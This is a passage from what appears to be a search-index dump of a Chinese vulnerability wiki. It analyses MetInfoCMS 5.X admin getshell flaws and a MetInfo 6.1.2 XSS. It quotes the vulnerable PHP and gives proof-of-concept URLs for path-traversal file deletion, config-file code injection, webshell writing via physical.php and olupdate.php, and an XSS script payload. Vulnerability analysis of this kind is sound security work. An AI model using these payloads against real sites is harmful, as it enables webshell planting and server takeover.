POC(xxx\u4e3a\u4efb\u610f\u7684shell\u76ee\u5f55\uff0cindex.php\u6587\u4ef6\u540d\u4e0d\u80fd\u4fee\u6539) \u00b6 \u751f\u6210\u7684shell\u5730\u5740\uff1a http://localhost/MetInfoCMS/xxx/index.php 0x04 olupdate\u6587\u4ef6\u7f3a\u9677\u5bfc\u81f4Getshell \u00b6 1. \u6f0f\u6d1e\u70b9 \u00b6 #/admin/system/olupdate.phpwen\u6587\u4ef6\u4e2d\uff0c\u5f53$action=sql,$sql!=No Date\u4e14$sqlfile\u4e0d\u662f\u6570\u7ec4\u65f6\u8fdb\u5165\u5982\u4e0b\u8fc7\u7a0b #326-360\u884c $num=1; $random = met_rand(6); $date=date('Ymd',time()); require_once '../system/database/global.func.php'; do{ $sqldump = ''; $startrow = ''; $tables=tableprearray($tablepre); $sizelimit=2048; $tableid = isset($tableid) ? $tableid - 1 : 0; $startfrom = isset($startfrom) ? intval($startfrom) : 0; $tablenumber = count($tables); for($i = $tableid; $i < $tablenumber && strlen($sqldump) < $sizelimit * 1000; $i++){ $sqldump .= sql_dumptable($tables[$i], $startfrom, strlen($sqldump)); $startfrom = 0; } $startfrom = $startrow; $tableid = $i; if(trim($sqldump)){ $sqlfile[]=$bakfile = \"../update/$addr/{$con_db_name}_{$date}_{$random}_{$num}.sql\"; $version='version:'.$metcms_v; $sqldump = \"#xxx.cn Created {$version} \\n#{$met_weburl}\\n#{$tablepre}\\n#{$met_webkeys}\\n# --------------------------------------------------------\\n\\n\\n\".$sqldump; if(!file_put_contents($bakfile, $sqldump)){ dl_error($lang_updaterr2.\"({$adminfile}/update/$addr/{$con_db_name}_{$date}_{$random}_{$num}.sql)\",$type,$olid,$ver,$addr,$action); } } $num++; } while(trim($sqldump)); if(is_array($sqlfile)) $string = \"<?php\\n \\$sqlfile = \".var_export($sqlfile, true).\"; ?>\"; filetest(\"../update/$addr/sqlist.php\"); if(!file_put_contents(\"../update/$addr/sqlist.php\",$string)){ dl_error($lang_updaterr2.\"({$adminfile}/update/$addr/sqlist.php)\",$type,$olid,$ver,$addr,$action); } \u6b64\u65f6\u7531\u4e8esqlfile\u4e0d\u662f\u6570\u7ec4\uff0c\u5373is_array( \\(sqlfile)\u4e0d\u6210\u7acb\uff0c\u5bfc\u81f4\\) string\u6ca1\u6709\u521d\u59cb\u5316\uff0c\u53ef\u4ee5\u4efb\u610f\u4fee\u6539\uff0c\u63a5\u7740\u8c03\u7528file_put_contents\u5c06string\u7684\u503c\u5199\u5230/update/$addr/sqlist.php\u6587\u4ef6\u3002 PS:\u8fd9\u91cc\u6709\u4e00\u4e2a\u5c0f\u70b9,\u7531\u4e8e\u8f93\u5165\u63a7\u5236sqlfile\u4e0d\u662f\u6570\u7ec4\uff0c\u7b2c345\u884c\u6267\u884c \\(sqlfile[]=\\) bakfile = \"../update/ \\(addr/{\\) con_dbname}{ \\(date}{\\) random}{ \\(num}.sql\";\u4f1a\u5bfc\u81f4\u7ed9\u5b57\u7b26\u4e32\u8d4b\u503c\u62a5\u9519\uff0c\u5bfc\u81f4\u65e0\u6cd5\u6267\u884c\u5230\u540e\u9762\u7684Getshell\u90e8\u5206\u3002\u6240\u4ee5\u9700\u8981\u6784\u9020payload\u4f7f\u5f97trim(\\) sqldump)\u4e3a\u7a7a\uff0c\u5373 \\(sqldump\u503c\u4e3a\u7a7a\uff0c\u4ece\u800c\u8df3\u8fc7\\) sqlfile[]\u8d4b\u503c\u90e8\u5206\uff0c\u8fd9\u91cc\u6784\u9020tableid=1000(\u5176\u5b9e\u53ea\u8981>=44\u5373\u53ef) \u6700\u540e\u7684payload\u7ed3\u6784\u5982\u4e0b\uff1a /admin/system/olupdate.php?action=sql&sqlfile=1&string=shell\u5185\u5bb9&addr=shell\u7684\u76ee\u5f55&tableid=1000 2.POC (\u53c2\u6570addr\u4e3a\u751f\u6210shell\u7684\u76ee\u5f55\uff0c\u751f\u6210shell\u7684\u6587\u4ef6\u540dsqlist.php\u4e0d\u53ef\u63a7) \u00b6 http://xxx.com/admin/system/olupdate.php?action=sql&sqlfile=1&string=<?php phpinfo();?>&addr=12313&tableid=1000 \u6267\u884c\u540e\u7684shell\u5730\u5740\uff1a http://xxx.com/admin/update/12313/sqlist.php 0x05\u5c0f\u7ed3 \u00b6 \u90fd\u662f\u9700\u8981\u540e\u53f0\u7ba1\u7406\u5458\u6743\u9650\u624d\u80fd\u5229\u7528\u7684\u6f0f\u6d1e\uff0c\u4e0d\u8fc7\u5371\u5bb3\u8fd8\u662f\u6bd4\u8f83\u5927\uff0c\u6ca1\u6709\u5347\u7ea7\u7684\u7f51\u7ad9\u8d76\u7d27\u5347\u7ea76.0\u7248\u672c\u54e6\uff01 \u524d\u51e0\u4e2a\u90fd\u6709\u4e00\u5b9a\u7684\u6761\u4ef6\u8981\u6c42\uff0c\u540e\u9762\u4e24\u4e2a\u6bd4\u8f83\u901a\u6740!","title":"MetInfoCMS 5.X\u7248\u672cGETSHELL\u6f0f\u6d1e\u5408\u96c6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#0x00","text":"2018\u5e741\u6708\u5e95MetInfoCMS\u5b98\u65b9\u9686\u91cd\u53d1\u5e036.0\u7248\u672c\uff0c\u8c03\u6574\u4e86\u4e4b\u524d\u201c\u6f0f\u6d1e\u767e\u51fa\u201d\u7684\u6846\u67b6\u7ed3\u6784\uff0c\u4fee\uff08\u675c\uff09\u590d\uff08\u7edd\uff09\u4e86\u591a\u4e2a5.X\u7684\u7248\u672c\u540e\u53f0Gestshell\u6f0f\u6d1e\u3002","title":"0x00 \u524d\u8a00"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#0x01getshell","text":"\u524d\u63d0:\u6709\u5220\u9664/config/install.lock\u6743\u9650 \u9ed8\u8ba4\u5b89\u88c5\u7684\u65f6\u5019\u8bbe\u7f6e\u4e86\u6743\u9650\u7684 @chmod ('../config/install.lock',0554);\uff0c\u6240\u4ee5\u9700\u8981\u5728\u6743\u9650\u4fee\u6539\u4e86\u7684\u60c5\u51b5\u4e0b\u624d\u80fd\u5229\u7528\u8fd9\u4e2a","title":"0x01\u5b89\u88c5\u8fc7\u7a0b\u8fc7\u6ee4\u4e0d\u4e25\u5bfc\u81f4Getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#1","text":"#/admin/app/batch/csvup.php $classflie=explode('_',$fileField); $classflie=explode('-',$classflie[count($classflie)-1]); $class1=$classflie[0]; $class2=$classflie[1]; $class3=$classflie[2]; $class=$class3?$class3:($class2?$class2:$class1); $classcsv=$db->get_one(\"select * from $met_column where id=$class\"); if(!$classcsv){ metsave(\"../app/batch/contentup.php?anyid=$anyid&lang=$lang\",$lang_csvnocolumn,$depth); } # \u7701\u7565\u4ee3\u7801 @file_unlink($flienamecsv); \u5220\u9664/config/install.lock\u6587\u4ef6\u53ef\u4ee5\u5bfc\u81f4\u91cd\u88c5\uff08\u9700\u8981\u7531\u5bf9\u5e94\u7684\u5220\u9664\u6743\u9650\uff09\uff0c\u5220\u9664\u6587\u4ef6\u7684poc\u5982\u4e0b\uff1a http://xxx.com/admin/app/batch/csvup.php?fileField=1_1231-1 & flienamecsv=../../../config/install.lock","title":"1. \u7ed3\u5408\u7f51\u4e0a\u7206\u51fa\u7684\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#2","text":"#/install/index.php case 'db_setup': { if($setup==1){ $db_prefix = trim($db_prefix); $db_host = trim($db_host); $db_username = trim($db_username); $db_pass = trim($db_pass); $db_name = trim($db_name); $config=\" <?php /* con_db_host = \\\"$db_host\\\" con_db_id = \\\"$db_username\\\" con_db_pass = \\\"$db_pass\\\" con_db_name = \\\"$db_name\\\" tablepre = \\\"$db_prefix\\\" db_charset = \\\"utf8\\\"; */ ?> \"; $fp=fopen(\"../config/config_db.php\",'w+'); fputs($fp,$config); fclose($fp); \u5728\u6570\u636e\u5e93\u914d\u7f6e\u65f6 \\(db_host,\\) db_username, \\(db_pass,\\) db_name,$db_prefix\u53c2\u6570\u53ef\u63a7\u3002","title":"2. \u91cd\u88c5\u65f6\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u8fc7\u6ee4\u4e0d\u5f53"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#3-poc","text":"\u6570\u636e\u5e93\u914d\u7f6e\u65f6\u4fee\u6539\u4efb\u610f\u53c2\u6570\u4e3a */phpinfo();/* \u53ef\u5bfc\u81f4Getshell\u3002\u70b9\u51fb\u4fdd\u5b58\u4e4b\u540e\uff0c\u76f4\u63a5\u8bbf\u95ee/config/config_db.php\u5373\u53efgetshell\u3002 shell\u5730\u5740: http://xxx.com/config/config_db.php","title":"3. POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#0x02-cve-2017-11347getshell","text":"\u524d\u63d0\uff1awindows\u670d\u52a1\u5668+\u7f51\u7ad9\u7edd\u5bf9\u8def\u5f84\uff08\u53ea\u9700\u8981\u77e5\u9053\u7f51\u7ad9index.php\u6240\u5728\u76ee\u5f55\u7684\u4e0a\u4e00\u7ea7\u76ee\u5f55\u540d\uff09","title":"0x02 CVE-2017-11347\u8865\u4e01\u7ed5\u8fc7\u7ee7\u7eedGetshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#1_1","text":"\u5229\u7528\u5b89\u88c5\u76ee\u5f55\u4e0b\u7684phpinfo\u6587\u4ef6\uff1a /install/phpinfo.php \u5229\u7528\u62a5\u9519\u4fe1\u606f( \u4fe1\u606f\u5728HTML\u6ce8\u91ca\u4e2d\uff0c\u5fc5\u987b\u901a\u8fc7\u67e5\u770b\u7f51\u9875\u6e90\u7801\u7684\u65b9\u5f0f\u624d\u80fd\u83b7\u53d6\u5185\u5bb9\uff0c\u5426\u5219\u770b\u4e0a\u53bb\u662f\u7a7a\u767d\u9875 ) /app/system/include/public/ui/admin/top.php /app/system/include/public/ui/admin/box.php /app/system/include/public/ui/web/sidebar.php","title":"1. \u67e5\u627e\u7edd\u5bf9\u8def\u5f84\u7684\u65b9\u6cd5\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#2_1","text":"5.3.19\u7248\u672c\u9488\u5bf9CVE-2017-11347\u7684\u8865\u4e01\u5206\u6790 switch($val[2]){ case 1: $address=\"../about/$fileaddr[1]\"; break; case 2: $address=\"../news/$fileaddr[1]\"; break; case 3: $address=\"../product/$fileaddr[1]\"; break; case 4: $address=\"../download/$fileaddr[1]\"; break; case 5: $address=\"../img/$fileaddr[1]\"; break; case 8: $address=\"../feedback/$fileaddr[1]\"; break; default: $address = \"\"; break; } $newfile =\"../../../$val[1]\"; if($address != ''){ Copyfile($address,$newfile); } } } \u5373\uff1a5.3.19\u7248\u672c\u91c7\u53d6\uff1a\u5373\u4f7f\u5728 \\(var[2]\u4e3a\u7a7a\u65f6\uff0c\u9ed8\u8ba4\u7ed9address\u53d8\u91cf\u8d4b\u503c\u4e3a\u7a7a\uff0c\u5e76\u4e14\u4f1a\u5224\u65adaddress\u53c2\u6570\u4e0d\u4e3a\u7a7a\u624d\u8c03\u7528Copyfile\u3002\u4f46\u662f\u5f53\\) var[2]\u4e0d\u4e3a\u7a7a\u65f6\uff0c\u7531\u4e8efileaddr[1]\u53ef\u63a7\u5bfc\u81f4\uff0c\u4ecd\u7136\u53ef\u4ee5\u63a7\u5236\u6587\u4ef6\u8def\u5f84\u4ece\u800cGetshell\u3002 \u6f0f\u6d1e\u5229\u7528(\u7f51\u7ad9\u5b89\u88c5\u5728\u670d\u52a1\u5668\u6839\u8def\u5f84\u7684\u60c5\u51b5)\uff1a \u7b2c\u4e00\u6b65\uff0c\u65b0\u5efa1.ico\u6587\u4ef6\uff0c\u5185\u5bb9\u4e3a\uff1a<?php phpinfo();?> \u5728\u540e\u53f0\"\u5730\u5740\u680f\u56fe\u6807\"\u5904\u4e0a\u4f20\u8be5\u6587\u4ef6\u3002 \u5f97\u5230\u5730\u5740\u4e3a\uff1a http://localhost/upload/file/1506587082.ico \u7b2c\u4e8c\u6b65\uff0c\u53d1\u9001\u5982\u4e0bpayload(\u6ce8\u610f\u5de6\u659c\u6760\u548c\u53f3\u659c\u6760\u4e0d\u80fd\u968f\u610f\u66f4\u6539): http://localhost/admin/app/physical/physical.php?action=op&op=3&valphy=test|/..\\upload\\file\\1506587082.ico/..\\..\\..\\www\\about\\shell.php|1 shell\u7684\u5730\u5740\u4e3a\uff1a http://localhost/about/shell.php","title":"2. \u6f0f\u6d1e\u5206\u6790"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#3-poc_1","text":"http://localhost/admin/app/physical/physical.php?action=op&op=3&valphy=test|/..\\\u4e0a\u4f20ico\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84/..\\..\\..\\\u7f51\u7ad9index.php\u8def\u5f84\u7684\u4e0a\u4e00\u5c42\u76ee\u5f55\u540d\\about\\webshell\u7684\u6587\u4ef6\u540d|1 \u7279\u522b\u6ce8\u610f\u5176\u4e2d\u7684\uff1a\u201c\u7f51\u7ad9index.php\u4e0a\u5c42\u76ee\u5f55\u540d\u201d\uff0c 1.\u5982\u679c\u7f51\u7ad9\u5b89\u88c5\u5728\u670d\u52a1\u5668\u6839\u76ee\u5f55\uff0c\u8fd9wamp/phpstudy\u9ed8\u8ba4\u76ee\u5f55\u503c\u4e3a\u201cwww\"\uff1b\u7f51\u7ad9index.php\u4e0a\u5c42\u76ee\u5f55\u540d\u8bbe\u7f6e\u4e3a\"www\"; \u5982\u679c\u4e3alamp\u73af\u5883\uff0c\u8fd9\u9ed8\u8ba4\u76ee\u5f55\u503c\u4e3a\u201chtml\u201d\u7f51\u7ad9index.php\u4e0a\u5c42\u76ee\u5f55\u540d\u8bbe\u7f6e\u4e3a\"html\";\u3002\u5176\u4ed6\u7684\u73af\u5883\u7c7b\u63a8\uff08\u5229\u7528\u7edd\u5bf9\u8def\u5f84\u6cc4\u9732\uff09\u3002 2.\u5982\u679c\u7f51\u7ad9\u5b89\u88c5\u5728\u670d\u52a1\u5668\u7684\u4e8c\u7ea7\u76ee\u5f55\u4e0b\uff0c\u5219\u7f51\u7ad9index.php\u4e0a\u5c42\u76ee\u5f55\u540d\u8bbe\u7f6e\u4e3a\u4e8c\u7ea7\u76ee\u5f55\u540d\u3002 \u4f8b\u5982:\u7f51\u7ad9\u642d\u5efa\u5728: http://localhost/MetInfoCMS /,\u5219\u7b2c\u4e8c\u6b65\u7684payload\u5982\u4e0b\uff1a http://localhost/MetInfoCMS/admin/app/physical/physical.php?action=op&op=3&valphy=test|/..\\upload\\file\\1506588072.ico/..\\MetInfoCMS.\\MetInfoCMS \\about\\shell.php|1 \u76f8\u5e94\u751f\u6210\u7684shell\u5730\u5740\u4e3a\uff1a http://localhost/MetInfoCMS/about/shell.php","title":"3. POC(\u6ce8\u610f\u5de6\u659c\u6760\u548c\u53f3\u659c\u6760\u4e0d\u80fd\u968f\u610f\u66f4\u6539)\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#0x03-copyindxgetshell","text":"","title":"0x03 Copyindx\u51fd\u6570\u5904\u7406\u4e0d\u5f53Getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#1_2","text":"\u6b64\u6f0f\u6d1e\u70b9\u4f4d\u4e8eadmin/app/physical/physical.php\u6587\u4ef6\uff0c\u6f0f\u6d1e\u548cCVE-2017-11347\u6f0f\u6d1e\u5341\u5206\u76f8\u4f3c\uff0c\u4f46\u662f\u5b58\u5728\u6839\u672c\u7684\u5dee\u5f02\uff0c\u4e0d\u540c\u70b9\u5982\u4e0b\uff1a \uff081\uff09\u89e6\u53d1\u51fd\u6570\u662fCopyindex\u51fd\u6570\uff0c\u800c\u975eCopyfile \uff082\uff09\u6b64\u6f0f\u6d1e\u4e0d\u662f\u5229\u7528\u6587\u4ef6\u5305\u542brequire_one\uff0c\u800c\u662f\u5229\u7528\u4efb\u610f\u5185\u5bb9\u5199\u5165 \uff083\uff09\u6b64\u6f0f\u6d1eGetshell\u4e0d\u9700\u8981\u4e0a\u4f20\u56fe\u7247 \uff084\uff09\u7ed3\u5408CSRF\u53ef\u4ee5\u5b9e\u73b0\u4e00\u952eGetshell","title":"1. \u58f0\u660e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#2_2","text":"# admin/app/physical/physical.php:197-236 switch($op){ case 1: if(is_dir('../../../'.$val[1])){ deldir('../../../'.$val[1]); echo $lang_physicaldelok; } else{unlink('../../../'.$val[1]); echo $lang_physicaldelok; } break; case 2: $adminfile=$url_array[count($url_array)-2]; $strsvalto=readmin($val[1],$adminfile,1); filetest('../../../'.$val[1]); deldir('../../../'.$val[1]); $dlappfile=parse_ini_file('dlappfile.php',true); if($dlappfile[$strsvalto]['dlfile']){ $return=varcodeb('app'); $checksum=$return['md5']; $met_file='/dl/app_curl.php'; $stringfile=dlfile($dlappfile[$strsvalto]['dlfile'],\"../../../$val[1]\"); }else{ $met_file='/dl/olupdate_curl.php'; $stringfile=dlfile(\"v$metcms_v/$strsvalto\",\"../../../$val[1]\"); } if($stringfile==1){ echo $lang_physicalupdatesuc; } else{ echo dlerror($stringfile); die(); } break; case 3: $fileaddr=explode('/',$val[1]); $filedir=\"../../../\".$fileaddr[0]; if(!file_exists($filedir)){ @mkdir ($filedir, 0777); } if($fileaddr[1]==\"index.php\"){ Copyindx(\"../../../\".$val[1],$val[2]); } \u5f53 \\(action\u7b49\u4e8eop\u800c\u4e14\\) op\u7b49\u4e8e3\u7684\u65f6\u5019\uff0c\u5982\u679c \\(filedir\u4e0d\u5b58\u5728\u5219\u521b\u5efa\\) filedir\u76ee\u5f55\uff0c\u800c\u4e14\u5982\u679c \\(fileaddr[1]\u7b49\u4e8e\"index.php\"\u5219\u8c03\u7528Copyindex\u51fd\u6570\uff0c\u5e76\u4f20\u5165\\) val[1]\u548c \\(val[2]\u53c2\u6570\uff0c\u6b64\u5904\u4e24\u4e2a\u53c2\u6570\u6765\u81ea\u53d8\u91cf\\) valphy,\u5747\u53ef\u63a7\uff01\uff01\u8ddf\u8fdbCopyindex\u51fd\u6570\u6e90\u7801\u5982\u4e0b\uff1a #admin/include/global.func.php:877-884 function Copyindx($newindx,$type){ if(!file_exists($newindx)){ $oldcont =\"<?php\\n# xxx Enterprise Content Management System \\n# Copyright (C) xxx Co.,Ltd (http://www.xxx.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\nrequire_once '../include/module.php'; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) xxx Co., Ltd. (http://www.xxx.cn). All rights reserved.\\n?>\"; $fp = fopen($newindx,w); fputs($fp, $oldcont); fclose($fp); } } \u53ef\u89c1\uff0c\u76f4\u63a5\u628a\u53c2\u6570 \\(type\u76f4\u63a5\u8d4b\u503c\u7ed9\\) fmodule,\u5e76\u5199\u5165\u6587\u4ef6\u5185\u5bb9\uff0c\u6240\u4ee5\u53ef\u4ee5\u6784\u9020payload\u76f4\u63a5getshell.","title":"2. \u6f0f\u6d1e\u70b9"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#3-pocxxxshellindexphp","text":"\u751f\u6210\u7684shell\u5730\u5740\uff1a http://localhost/MetInfoCMS/xxx/index.php","title":"3. POC(xxx\u4e3a\u4efb\u610f\u7684shell\u76ee\u5f55\uff0cindex.php\u6587\u4ef6\u540d\u4e0d\u80fd\u4fee\u6539)"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#0x04-olupdategetshell","text":"","title":"0x04 olupdate\u6587\u4ef6\u7f3a\u9677\u5bfc\u81f4Getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#1_3","text":"#/admin/system/olupdate.phpwen\u6587\u4ef6\u4e2d\uff0c\u5f53$action=sql,$sql!=No Date\u4e14$sqlfile\u4e0d\u662f\u6570\u7ec4\u65f6\u8fdb\u5165\u5982\u4e0b\u8fc7\u7a0b #326-360\u884c $num=1; $random = met_rand(6); $date=date('Ymd',time()); require_once '../system/database/global.func.php'; do{ $sqldump = ''; $startrow = ''; $tables=tableprearray($tablepre); $sizelimit=2048; $tableid = isset($tableid) ? $tableid - 1 : 0; $startfrom = isset($startfrom) ? intval($startfrom) : 0; $tablenumber = count($tables); for($i = $tableid; $i < $tablenumber && strlen($sqldump) < $sizelimit * 1000; $i++){ $sqldump .= sql_dumptable($tables[$i], $startfrom, strlen($sqldump)); $startfrom = 0; } $startfrom = $startrow; $tableid = $i; if(trim($sqldump)){ $sqlfile[]=$bakfile = \"../update/$addr/{$con_db_name}_{$date}_{$random}_{$num}.sql\"; $version='version:'.$metcms_v; $sqldump = \"#xxx.cn Created {$version} \\n#{$met_weburl}\\n#{$tablepre}\\n#{$met_webkeys}\\n# --------------------------------------------------------\\n\\n\\n\".$sqldump; if(!file_put_contents($bakfile, $sqldump)){ dl_error($lang_updaterr2.\"({$adminfile}/update/$addr/{$con_db_name}_{$date}_{$random}_{$num}.sql)\",$type,$olid,$ver,$addr,$action); } } $num++; } while(trim($sqldump)); if(is_array($sqlfile)) $string = \"<?php\\n \\$sqlfile = \".var_export($sqlfile, true).\"; ?>\"; filetest(\"../update/$addr/sqlist.php\"); if(!file_put_contents(\"../update/$addr/sqlist.php\",$string)){ dl_error($lang_updaterr2.\"({$adminfile}/update/$addr/sqlist.php)\",$type,$olid,$ver,$addr,$action); } \u6b64\u65f6\u7531\u4e8esqlfile\u4e0d\u662f\u6570\u7ec4\uff0c\u5373is_array( \\(sqlfile)\u4e0d\u6210\u7acb\uff0c\u5bfc\u81f4\\) string\u6ca1\u6709\u521d\u59cb\u5316\uff0c\u53ef\u4ee5\u4efb\u610f\u4fee\u6539\uff0c\u63a5\u7740\u8c03\u7528file_put_contents\u5c06string\u7684\u503c\u5199\u5230/update/$addr/sqlist.php\u6587\u4ef6\u3002 PS:\u8fd9\u91cc\u6709\u4e00\u4e2a\u5c0f\u70b9,\u7531\u4e8e\u8f93\u5165\u63a7\u5236sqlfile\u4e0d\u662f\u6570\u7ec4\uff0c\u7b2c345\u884c\u6267\u884c \\(sqlfile[]=\\) bakfile = \"../update/ \\(addr/{\\) con_dbname}{ \\(date}{\\) random}{ \\(num}.sql\";\u4f1a\u5bfc\u81f4\u7ed9\u5b57\u7b26\u4e32\u8d4b\u503c\u62a5\u9519\uff0c\u5bfc\u81f4\u65e0\u6cd5\u6267\u884c\u5230\u540e\u9762\u7684Getshell\u90e8\u5206\u3002\u6240\u4ee5\u9700\u8981\u6784\u9020payload\u4f7f\u5f97trim(\\) sqldump)\u4e3a\u7a7a\uff0c\u5373 \\(sqldump\u503c\u4e3a\u7a7a\uff0c\u4ece\u800c\u8df3\u8fc7\\) sqlfile[]\u8d4b\u503c\u90e8\u5206\uff0c\u8fd9\u91cc\u6784\u9020tableid=1000(\u5176\u5b9e\u53ea\u8981>=44\u5373\u53ef) \u6700\u540e\u7684payload\u7ed3\u6784\u5982\u4e0b\uff1a /admin/system/olupdate.php?action=sql&sqlfile=1&string=shell\u5185\u5bb9&addr=shell\u7684\u76ee\u5f55&tableid=1000","title":"1. \u6f0f\u6d1e\u70b9"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#2poc-addrshellshellsqlistphp","text":"http://xxx.com/admin/system/olupdate.php?action=sql&sqlfile=1&string=<?php phpinfo();?>&addr=12313&tableid=1000 \u6267\u884c\u540e\u7684shell\u5730\u5740\uff1a http://xxx.com/admin/update/12313/sqlist.php","title":"2.POC (\u53c2\u6570addr\u4e3a\u751f\u6210shell\u7684\u76ee\u5f55\uff0c\u751f\u6210shell\u7684\u6587\u4ef6\u540dsqlist.php\u4e0d\u53ef\u63a7)"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#0x05","text":"\u90fd\u662f\u9700\u8981\u540e\u53f0\u7ba1\u7406\u5458\u6743\u9650\u624d\u80fd\u5229\u7528\u7684\u6f0f\u6d1e\uff0c\u4e0d\u8fc7\u5371\u5bb3\u8fd8\u662f\u6bd4\u8f83\u5927\uff0c\u6ca1\u6709\u5347\u7ea7\u7684\u7f51\u7ad9\u8d76\u7d27\u5347\u7ea76.0\u7248\u672c\u54e6\uff01 \u524d\u51e0\u4e2a\u90fd\u6709\u4e00\u5b9a\u7684\u6761\u4ef6\u8981\u6c42\uff0c\u540e\u9762\u4e24\u4e2a\u6bd4\u8f83\u901a\u6740!","title":"0x05\u5c0f\u7ed3"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/Metinfo-6.1.2%E7%89%88%E6%9C%AC%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%26SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Metinfo-6.1.2\u7248\u672c\u5b58\u5728XSS\u6f0f\u6d1e&SQL\u6ce8\u5165\u6f0f\u6d1e 2018-10-12 \u8e0f\u6708\u7559\u9999 https://www.metinfo.cn/ \u4e0b\u8f7d\u5730\u5740 6.1.2 CVE-2018-18296 / CVE-2018-17129 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 \u6f0f\u6d1e\u5b58\u5728\u4e8eMetInfo6.1.2/admin/index.php\u9875\u9762\uff0c\u7531\u4e8e\u53c2\u6570bigclass\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u5bfc\u81f4XSS\u6f0f\u6d1e \u672c\u5730\u642d\u5efa\u7f51\u7ad9\uff0c\u9996\u5148\u767b\u5f55\u7f51\u7ad9\u540e\u53f0: http://172.16.141.134/MetInfo6.1.2/admin/ \uff0c\u767b\u5f55\u6210\u529f\u540e\uff0c\u6784\u9020payload\uff1a http://172.16.141.134/MetInfo6.1.2/admin/index.php?lang=cn&anyid=25&n=column&c=index&a=doadd&bigclass=1%22%3e%3cscript%3ealert(/xss/)%3c%2fscript%3e \uff0c\u5373\u53ef\u6267\u884c\u8de8\u7ad9\u811a\u672c\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 XSS\u6f0f\u6d1e\u7684 exp\u4ee3\u7801\u5982\u4e0b\uff1a http://127.0.0.1/MetInfo6.1.2/admin/index.php?lang=cn & anyid=25 & n=column & c=index & a=doadd & bigclass=1%22%3e%3cscript%3ealert(/xss/)%3c%2fscript%3e SQL\u6ce8\u5165\u6f0f\u6d1e\u7684 exp\u4ee3\u7801\u5982\u4e0b\uff1a \u6f0f\u6d1e\u5b58\u5728\u4e8eMetInfo6.1.2 /app/system/feedback/admin/feedback_admin.class.php 